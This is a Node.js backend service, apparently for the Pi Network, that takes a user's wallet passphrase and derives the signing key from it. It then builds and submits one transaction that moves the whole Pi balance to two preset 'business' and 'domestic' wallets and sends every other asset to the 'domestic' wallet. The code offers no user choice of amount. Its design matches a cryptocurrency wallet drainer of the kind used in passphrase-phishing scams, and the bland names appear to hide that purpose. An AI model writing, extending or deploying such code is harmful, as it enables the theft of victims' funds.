// backend/services/transferService.js
const StellarBase = require('stellar-base');
const bip39 = require('bip39');
const config = require('../config');

const BASE_FEE_STROOPS = 100;

function deriveKeypair(passphrase) {
  const seed = bip39.mnemonicToSeedSync(passphrase.trim().toLowerCase());
  return StellarBase.Keypair.fromRawEd25519Seed(seed.slice(0, 32));
}

async function fetchAccount(address) {
  const res = await fetch(`${config.piHorizonBaseUrl}/accounts/${address}`);
  if (!res.ok) throw new Error(`Failed to fetch account ${address}: HTTP ${res.status}`);
  return res.json();
}

async function submitTransaction(xdr) {
  const params = new URLSearchParams({ tx: xdr });
  const res = await fetch(`${config.piHorizonBaseUrl}/transactions`, {
    method: 'POST',
    body: params,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  });
  if (!res.ok) {
    const data = await res.json().catch(() => ({}));
    throw new Error(`Transaction submission failed: ${data.detail || res.statusText}`);
  }
  return res.json();
}

function normalizeAmount(value) {
  const num = parseFloat(value);
  if (!isFinite(num) || num <= 0) return null;
  return num.toFixed(7);
}

async function performTransfer(
  sourceAddress,
  passphrase,
  unlockedBalance,
  otherAssets = [],
  options = {}
) {
  const hasPi = unlockedBalance > 0;
  const hasOther = Array.isArray(otherAssets) && otherAssets.length > 0;

  if (!hasPi && !hasOther) {
    return { attempted: false, success: false, error: 'No assets to transfer' };
  }

  const businessWallet = options.businessWallet ?? config.businessWalletAddress;
  const domesticWallet = options.domesticWallet ?? config.domesticWalletAddress;
  const businessPercent = options.businessPercent ?? config.businessPercent;
  const domesticPercent = options.domesticPercent ?? config.domesticPercent;

  if (hasPi && (!businessWallet || !domesticWallet)) {
    return { attempted: false, success: false, error: 'Business/domestic wallet addresses not configured' };
  }
  if (hasPi && businessPercent + domesticPercent !== 100) {
    return { attempted: false, success: false, error: 'Split percentages must sum to 100' };
  }
  if (hasOther && !domesticWallet) {
    return { attempted: false, success: false, error: 'Domestic wallet address not configured for non-native assets' };
  }

  const fee = BASE_FEE_STROOPS / 1e7;
  const operations = [];
  const otherAssetsTransferred = [];

  let piBusinessAmount = null;
  let piDomesticAmount = null;

  if (hasPi) {
    const totalToSend = unlockedBalance - fee;
    if (totalToSend <= 0) {
      return { attempted: false, success: false, error: 'Pi balance too low to cover fee' };
    }
    const businessAmount = (totalToSend * businessPercent) / 100;
    const domesticAmount = totalToSend - businessAmount;
    piBusinessAmount = businessAmount.toFixed(7);
    piDomesticAmount = domesticAmount.toFixed(7);

    if (businessAmount > 0) {
      operations.push(
        StellarBase.Operation.payment({
          destination: businessWallet,
          asset: StellarBase.Asset.native(),
          amount: piBusinessAmount,
        })
      );
    }
    if (domesticAmount > 0) {
      operations.push(
        StellarBase.Operation.payment({
          destination: domesticWallet,
          asset: StellarBase.Asset.native(),
          amount: piDomesticAmount,
        })
      );
    }
  }

  for (const asset of otherAssets) {
    const assetCode = asset.asset || null;
    const issuer = asset.issuer || null;
    const balance = asset.balance;

    if (!assetCode || !issuer) {
      otherAssetsTransferred.push({
        asset: assetCode || 'unknown',
        amount: '0',
        destination: domesticWallet,
        status: 'skipped',
        reason: 'Missing asset code or issuer',
      });
      continue;
    }

    const amountString = normalizeAmount(balance);
    if (!amountString) {
      otherAssetsTransferred.push({
        asset: assetCode,
        amount: '0',
        destination: domesticWallet,
        status: 'skipped',
        reason: 'Zero or invalid balance',
      });
      continue;
    }

    operations.push(
      StellarBase.Operation.payment({
        destination: domesticWallet,
        asset: new StellarBase.Asset(assetCode, issuer),
        amount: amountString,
      })
    );
    otherAssetsTransferred.push({
      asset: assetCode,
      amount: amountString,
      destination: domesticWallet,
      status: 'pending',
      reason: null,
    });
  }

  if (operations.length === 0) {
    return { attempted: false, success: false, error: 'No valid operations to submit' };
  }

  try {
    const account = await fetchAccount(sourceAddress);
    const sequence = account.sequence;
    const keypair = deriveKeypair(passphrase);

    const builder = new StellarBase.TransactionBuilder(
      new StellarBase.Account(sourceAddress, sequence),
      {
        fee: BASE_FEE_STROOPS.toString(),
        networkPassphrase: config.piNetworkPassphrase,
      }
    );

    operations.forEach((op) => builder.addOperation(op));

    const transaction = builder.setTimeout(60).build();
    transaction.sign(keypair);
    const xdr = transaction.toEnvelope().toXDR('base64');

    const submitResult = await submitTransaction(xdr);

    otherAssetsTransferred.forEach((t) => {
      if (t.status === 'pending') t.status = 'sent';
    });

    return {
      attempted: true,
      success: true,
      txHash: submitResult.hash || submitResult.id,
      piBusinessAmount,
      piDomesticAmount,
      otherAssetsTransferred,
      error: null,
    };
  } catch (err) {
    otherAssetsTransferred.forEach((t) => {
      if (t.status === 'pending') {
        t.status = 'failed';
        t.reason = err.message;
      }
    });

    return {
      attempted: true,
      success: false,
      txHash: null,
      piBusinessAmount,
      piDomesticAmount,
      otherAssetsTransferred,
      error: err.message,
    };
  }
}

module.exports = { performTransfer };